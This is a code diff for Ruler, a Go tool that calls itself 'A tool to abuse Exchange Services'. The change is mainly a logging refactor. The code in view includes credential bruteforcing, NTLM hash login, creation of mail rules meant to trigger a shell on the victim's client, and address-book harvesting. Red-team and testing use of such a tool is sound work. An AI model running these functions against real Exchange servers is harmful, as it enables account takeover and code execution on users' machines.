@@ -4,6 +4,7 @@ import (
 	"bufio"
 	"encoding/hex"
 	"fmt"
+	"io/ioutil"
 	"net/http"
 	"net/http/cookiejar"
 	"net/url"
@@ -24,13 +25,13 @@ var config utils.Session
 func exit(err error) {
 	//we had an error
 	if err != nil {
-		fmt.Println(err)
+		utils.Error.Println(err)
 	}
 
 	//let's disconnect from the MAPI session
 	exitcode, err := mapi.Disconnect()
 	if err != nil {
-		fmt.Println(err)
+		utils.Error.Println(err)
 	}
 	os.Exit(exitcode)
 }
@@ -48,7 +49,7 @@ func brute(c *cli.Context) error {
 		return fmt.Errorf("Either --domain or --url required")
 	}
 
-	fmt.Println("[*] Starting bruteforce")
+	utils.Info.Println("Starting bruteforce")
 	userpass := c.String("userpass")
 
 	if userpass == "" {
@@ -69,24 +70,24 @@ func brute(c *cli.Context) error {
 
 //Function to add new rule
 func addRule(c *cli.Context) error {
-	fmt.Println("[*] Adding Rule")
+	utils.Info.Println("Adding Rule")
 
 	res, err := mapi.ExecuteMailRuleAdd(c.String("name"), c.String("trigger"), c.String("location"), true)
 	if err != nil || res.StatusCode == 255 {
-		return fmt.Errorf("[x] Failed to create rule. %s", err)
+		return fmt.Errorf("Failed to create rule. %s", err)
 	}
 
-	fmt.Println("[*] Rule Added. Fetching list of rules...")
+	utils.Info.Println("Rule Added. Fetching list of rules...")
 
 	printRules()
 
 	if c.Bool("send") {
-		fmt.Println("[*] Auto Send enabled, wait 30 seconds before sending email (synchronisation)")
+		utils.Info.Println("Auto Send enabled, wait 30 seconds before sending email (synchronisation)")
 		//initate a ping sequence, just incase we are on RPC/HTTP
 		//we need to keep the socket open
 		go mapi.Ping()
 		time.Sleep(time.Second * (time.Duration)(30))
-		fmt.Println("[*] Sending email")
+		utils.Info.Println("Sending email")
 		if c.String("subject") == "" {
 			sendMessage(c.String("trigger"), c.String("body"))
 		} else {
@@ -108,37 +109,37 @@ func deleteRule(c *cli.Context) error {
 		if er != nil {
 			return er
 		}
-		fmt.Printf("[+] Found %d rules\n[*] Extracting ids\n", len(rules))
+		utils.Info.Printf("Found %d rules\nExtracting ids\n", len(rules))
 		for _, v := range rules {
 			if utils.FromUnicode(v.RuleName) == c.String("name") {
 				reader := bufio.NewReader(os.Stdin)
-				fmt.Printf("[?] Delete rule with id %x [y/N]: ", v.RuleID)
+				utils.Info.Printf("[?] Delete rule with id %x [y/N]: ", v.RuleID)
 				ans, _ := reader.ReadString('\n')
 				if ans == "y\n" || ans == "Y\n" || ans == "yes\n" {
 					ruleid = v.RuleID
 					err = mapi.ExecuteMailRuleDelete(ruleid)
 					if err != nil {
-						fmt.Printf("[x] Failed to delete rule")
+						utils.Error.Printf("Failed to delete rule")
 					}
 				}
 			}
 		}
 		if ruleid == nil {
-			return fmt.Errorf("[x] No rule with supplied name found")
+			return fmt.Errorf("No rule with supplied name found")
 		}
 	} else {
 		ruleid, err = hex.DecodeString(c.String("id"))
 		if err != nil {
-			return fmt.Errorf("[x] Incorrect ruleid format. Try --name if you wish to supply a rule's name rather than id")
+			return fmt.Errorf("Incorrect ruleid format. Try --name if you wish to supply a rule's name rather than id")
 		}
 		err = mapi.ExecuteMailRuleDelete(ruleid)
 		if err != nil {
-			fmt.Printf("[x] Failed to delete rule")
+			utils.Error.Printf("Failed to delete rule")
 		}
 	}
 
 	if err == nil {
-		fmt.Println("[*] Fetching list of remaining rules...")
+		utils.Info.Println("Fetching list of remaining rules...")
 		er := printRules()
 		if er != nil {
 			return er
@@ -149,7 +150,7 @@ func deleteRule(c *cli.Context) error {
 
 //Function to display all rules
 func displayRules(c *cli.Context) error {
-	fmt.Println("[+] Retrieving Rules")
+	utils.Info.Println("Retrieving Rules")
 	er := printRules()
 	return er
 }
@@ -167,7 +168,7 @@ func sendMessage(subject, body string) error {
 	if er != nil {
 		return er
 	}
-	fmt.Println("[*] Message sent, your shell should trigger shortly.")
+	utils.Info.Println("Message sent, your shell should trigger shortly.")
 
 	return nil
 }
@@ -186,13 +187,13 @@ func connect(c *cli.Context) error {
 		pass, err = gopass.GetPasswd()
 		if err != nil {
 			// Handle gopass.ErrInterrupted or getch() read error
-			return fmt.Errorf("[x] Password or hash required. Supply NTLM hash with --hash")
+			return fmt.Errorf("Password or hash required. Supply NTLM hash with --hash")
 		}
 		config.Pass = string(pass)
 	} else {
 		config.Pass = c.GlobalString("password")
 		if config.NTHash, err = hex.DecodeString(c.GlobalString("hash")); err != nil {
-			return fmt.Errorf("[x] Invalid hash provided. Hex decode failed")
+			return fmt.Errorf("Invalid hash provided. Hex decode failed")
 		}
 
 	}
@@ -220,7 +221,7 @@ func connect(c *cli.Context) error {
 		if eparts := strings.Split(c.GlobalString("email"), "@"); len(eparts) == 2 {
 			cdomain = eparts[1]
 		} else {
-			return fmt.Errorf("[x] Invalid email address")
+			return fmt.Errorf("Invalid email address")
 		}
 
 		for _, v := range cookies {
@@ -269,23 +270,23 @@ func connect(c *cli.Context) error {
 		userDN = resp.Response.User.LegacyDN
 
 		if mapiURL == "" { //try RPC
-			//fmt.Println("[x] No MAPI URL found. Trying RPC/HTTP")
+			//fmt.Println("No MAPI URL found. Trying RPC/HTTP")
 			resp, _, config.RPCURL, config.RPCMailbox, config.RPCEncrypt, err = autodiscover.GetRPCHTTP(config.Email, url, resp)
 			if err != nil {
 				exit(err)
 			}
 			if resp.Response.User.LegacyDN == "" {
-				return fmt.Errorf("[x] Both MAPI/HTTP and RPC/HTTP failed. Are the credentials valid? \n%s", resp.Response.Error)
+				return fmt.Errorf("Both MAPI/HTTP and RPC/HTTP failed. Are the credentials valid? \n%s", resp.Response.Error)
 			}
 			mapi.Init(&config, resp.Response.User.LegacyDN, "", "", mapi.RPC)
 			if c.GlobalBool("nocache") == false {
 				autodiscover.CreateCache(config.Email, rawAutodiscover) //store the autodiscover for future use
 			}
 		} else {
-			if c.GlobalBool("verbose") == true {
-				fmt.Println("[+] MAPI URL found: ", mapiURL)
-				fmt.Println("[+] MAPI AddressBook URL found: ", abkURL)
-			}
+
+			utils.Trace.Println("MAPI URL found: ", mapiURL)
+			utils.Trace.Println("MAPI AddressBook URL found: ", abkURL)
+
 			mapi.Init(&config, userDN, mapiURL, abkURL, mapi.HTTP)
 			if c.GlobalBool("nocache") == false {
 				autodiscover.CreateCache(config.Email, rawAutodiscover) //store the autodiscover for future use
@@ -293,7 +294,7 @@ func connect(c *cli.Context) error {
 		}
 
 	} else {
-		fmt.Println("[*] RPC/HTTP forced, trying RPC/HTTP")
+		utils.Trace.Println("RPC/HTTP forced, trying RPC/HTTP")
 		resp, rawAutodiscover, config.RPCURL, config.RPCMailbox, config.RPCEncrypt, err = autodiscover.GetRPCHTTP(config.Email, url, resp)
 		if err != nil {
 			exit(err)
@@ -310,10 +311,10 @@ func connect(c *cli.Context) error {
 	if err != nil {
 		exit(err)
 	} else if logon.MailboxGUID != nil {
-		if c.GlobalBool("verbose") {
-			fmt.Println("[*] And we are authenticated")
-			fmt.Println("[*] Openning the Inbox")
-		}
+
+		utils.Trace.Println("And we are authenticated")
+		utils.Trace.Println("Openning the Inbox")
+
 		propertyTags := make([]mapi.PropertyTag, 2)
 		propertyTags[0] = mapi.PidTagDisplayName
 		propertyTags[1] = mapi.PidTagSubfolders
@@ -330,7 +331,7 @@ func printRules() error {
 	}
 
 	if len(rules) > 0 {
-		fmt.Printf("[+] Found %d rules\n", len(rules))
+		utils.Info.Printf("Found %d rules\n", len(rules))
 		maxwidth := 30
 
 		for _, v := range rules {
@@ -341,14 +342,14 @@ func printRules() error {
 		maxwidth -= 10
 		fmstr1 := fmt.Sprintf("%%-%ds | %%-s\n", maxwidth)
 		fmstr2 := fmt.Sprintf("%%-%ds | %%x\n", maxwidth)
-		fmt.Printf(fmstr1, "Rule Name", "Rule ID")
-		fmt.Printf("%s|%s\n", (strings.Repeat("-", maxwidth+1)), strings.Repeat("-", 18))
+		utils.Info.Printf(fmstr1, "Rule Name", "Rule ID")
+		utils.Info.Printf("%s|%s\n", (strings.Repeat("-", maxwidth+1)), strings.Repeat("-", 18))
 		for _, v := range rules {
-			fmt.Printf(fmstr2, string(utils.FromUnicode(v.RuleName)), v.RuleID)
+			utils.Info.Printf(fmstr2, string(utils.FromUnicode(v.RuleName)), v.RuleID)
 		}
-		fmt.Println()
+		utils.Info.Println()
 	} else {
-		fmt.Printf("[+] No Rules Found\n")
+		utils.Info.Printf("No Rules Found\n")
 	}
 	return nil
 }
@@ -356,35 +357,27 @@ func printRules() error {
 //Function to display all rules
 func abkList(c *cli.Context) error {
 	if config.Transport == mapi.RPC {
-		return fmt.Errorf("[x] Address book support is currently limited to MAPI/HTTP")
+		return fmt.Errorf("Address book support is currently limited to MAPI/HTTP")
 	}
-	fmt.Println("[*] Let's play addressbook")
+	utils.Trace.Println("Let's play addressbook")
 	mapi.BindAddressBook()
 	columns := make([]mapi.PropertyTag, 2)
 	columns[0] = mapi.PidTagSMTPAddress
 	columns[1] = mapi.PidTagDisplayName
 	rows, _ := mapi.QueryRows(10, columns) //pull first 255 entries
-	fmt.Println("[*] Found the following entries: ")
+	utils.Info.Println("Found the following entries: ")
 	for k := 0; k < int(rows.RowCount); k++ {
 		for v := 0; v < int(rows.Columns.PropertyTagCount); v++ {
 			//value, p = mapi.ReadPropertyValue(rows.RowData[k].ValueArray[p:], rows.Columns.PropertyTags[v].PropertyType)
-			fmt.Printf("%s :: ", rows.RowData[k].AddressBookPropertyValue[v].Value)
+			utils.Info.Printf("%s :: ", rows.RowData[k].AddressBookPropertyValue[v].Value)
 		}
-		fmt.Println("")
-	}
-	rows, _ = mapi.QueryRows(10, columns) //pull first 255 entries
-	fmt.Println("[*] Found the following entries: ")
-	for k := 0; k < int(rows.RowCount); k++ {
-		for v := 0; v < int(rows.Columns.PropertyTagCount); v++ {
-			//value, p = mapi.ReadPropertyValue(rows.RowData[k].ValueArray[p:], rows.Columns.PropertyTags[v].PropertyType)
-			fmt.Printf("%s :: ", rows.RowData[k].AddressBookPropertyValue[v].Value)
-		}
-		fmt.Println("")
+		utils.Info.Println("")
 	}
 	return nil
 }
 
 func main() {
+
 	app := cli.NewApp()
 	app.Name = "ruler"
 	app.Usage = "A tool to abuse Exchange Services"
@@ -466,6 +459,15 @@ A tool by @_staaldraad from @sensepost to abuse Exchange Services.`
 			Name:  "verbose",
 			Usage: "Be verbose and show some of thei inner workings",
 		},
+	}
+
+	app.Before = func(c *cli.Context) error {
+		if c.Bool("verbose") == true {
+			utils.Init(os.Stdout, os.Stdout, os.Stdout, os.Stderr)
+		} else {
+			utils.Init(ioutil.Discard, os.Stdout, os.Stdout, os.Stderr)
+		}
+		return nil
 	}
 
 	app.Commands = []cli.Command{
@@ -576,7 +578,7 @@ A tool by @_staaldraad from @sensepost to abuse Exchange Services.`
 				if err != nil {
 					return cli.NewExitError(err, 1)
 				}
-				fmt.Println("[*] Looks like we are good to go!")
+				utils.Info.Println("Looks like we are good to go!")
 				return nil
 			},
 		},
@@ -683,7 +685,7 @@ A tool by @_staaldraad from @sensepost to abuse Exchange Services.`
 			Aliases: []string{"t"},
 			Usage:   "Troopers",
 			Action: func(c *cli.Context) error {
-				fmt.Println("Ruler - Troopers 17 Edition")
+				utils.Info.Println("Ruler - Troopers 17 Edition")
 				st := `.___________..______        ______     ______   .______    _______ .______          _______.
 |           ||   _  \      /  __  \   /  __  \  |   _  \  |   ____||   _  \        /       |
  ---|  |----|   |_)  |    |  |  |  | |  |  |  | |  |_)  | |  |__   |  |_)  |      |   (----
@@ -692,7 +694,7 @@ A tool by @_staaldraad from @sensepost to abuse Exchange Services.`
     |__|     | _| ._____|  \______/   \______/  | _|      |_______|| _| ._____|_______/
 
 		https://www.troopers.de/troopers17/`
-				fmt.Println(st)
+				utils.Info.Println(st)
 				return nil
 			},
 		},
